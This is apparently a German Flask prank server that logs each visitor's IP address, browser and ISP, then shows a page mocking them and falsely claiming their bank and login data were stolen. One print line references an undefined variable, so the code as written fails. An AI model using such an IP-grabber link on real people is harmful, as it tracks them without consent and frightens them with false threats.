from flask import Flask, request
from datetime import datetime
import requests

app = Flask(__name__)

def get_provider(ip):
    try:
        response = requests.get(f"https://ipwho.is/{ip}", timeout=3)
        data = response.json()
        if data["success"]:
            return data.get("isp", "unbekannt")
        else:
            return "unbekannt"
    except:
        return "unbekannt"

@app.route("/")
def handler():
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "unbekannt")

    # Provider abrufen
    provider = get_provider(ip)

    # Einfacher Bot/Mensch-Test
    is_bot = any(bot in user_agent.lower() for bot in ["bot", "preview", "crawler", "spider", "whatsapp", "telegram"])
    menschlich = "✅ JA" if not is_bot else "❌ NEIN"

    print("========== NEUER BESUCH ==========")
    print(f"🕒 Zeit          : {now}")
    print(f"🌐 IP-Adresse   : {ip}")
    print(f"🌐 Standort      : {Standort}")
    print(f"🧭 Browser       : {user_agent}")
    print(f"📡 Provider      : {provider}")
    print(f"👤 Echter Mensch : {menschlich}")
    print("==================================")

    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Danke für deinen Besuch</title>
        <style>
            body {
                background-color: #f2f2f2;
                font-family: Arial, sans-serif;
                text-align: center;
                padding-top: 100px;
            }
            .warning {
                color: red;
                font-size: 36px;
                font-weight: bold;
                animation: blink 1s infinite;
            }
            @keyframes blink {
                0% { opacity: 1; }
                50% { opacity: 0; }
                100% { opacity: 1; }
            }
            .button {
                margin-top: 30px;
                padding: 15px 30px;
                font-size: 18px;
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            .button:hover {
                background-color: #45a049;
            }
        </style>
        <script>
            function showMessage() {
                alert("Oh mein Gott... wirklich? Dein Ernst? Wie kann man nur so beschränkt sein, dass du ehrlich jetzt noch hier auf diesen Button klickst? Wie man sieht, hast du nichts gecheckt. 50 Mark per PayPal an: info@bruder-ich-bin-wirklich-doof.de");
            }
        </script>
    </head>
    <body>
        <h1>Danke für deinen Besuch!</h1>
        <p>Oh mein Gott... wie dämlich kann man sein, einfach auf so einen Link zu klicken?</p>
        <p>Vielen lieben Dank für deine ganzen privaten Daten, unter anderem auch deine Bankdaten und Login-Daten.</p>
        <p style="color: red; font-weight: bold;">Vielleicht nicht jeden Link einfach anklicken, Bruder.</p>
        <p class="warning">CHECKST DU?</p>
        <button class="button" onclick="showMessage()">Ich will meine Daten zurück</button>
    </body>
    </html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
